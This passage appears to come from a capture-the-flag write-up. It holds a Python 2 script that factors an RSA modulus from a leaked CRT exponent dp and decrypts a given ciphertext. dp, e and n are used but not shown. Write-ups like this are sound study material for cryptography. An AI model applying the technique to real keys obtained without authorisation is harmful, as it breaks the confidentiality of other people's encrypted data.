c = 14874271064669918581178066047207495551570421575260298116038863877424499500626920855863261194264169850678206604144314318171829367575688726593323863145664241189167820996601561389159819873734368810449011761054668595565217970516125181240869998009561140277444653698278073509852288720276008438965069627886972839146199102497874818473454932012374251932864118784065064885987416408142362577322906063320726241313252172382519793691513360909796645028353257317044086708114163313328952830378067342164675055195428728335222242094290731292113709866489975077052604333805889421889967835433026770417624703011718120347415460385182429795735
for i in range(1, 65538):
    if (dp * e - 1) % i == 0:	# (dp * e - 1) = i*(p-1)
        if n % (((dp * e - 1) / i) + 1) == 0:
            p = ((dp * e - 1) / i) + 1
            q = n / (((dp * e - 1) / i) + 1)
            phi = (p - 1) * (q - 1)
            d = gmpy2.invert(e, phi) 
            m = pow(c, d, n)
            print long_to_bytes(m)
```
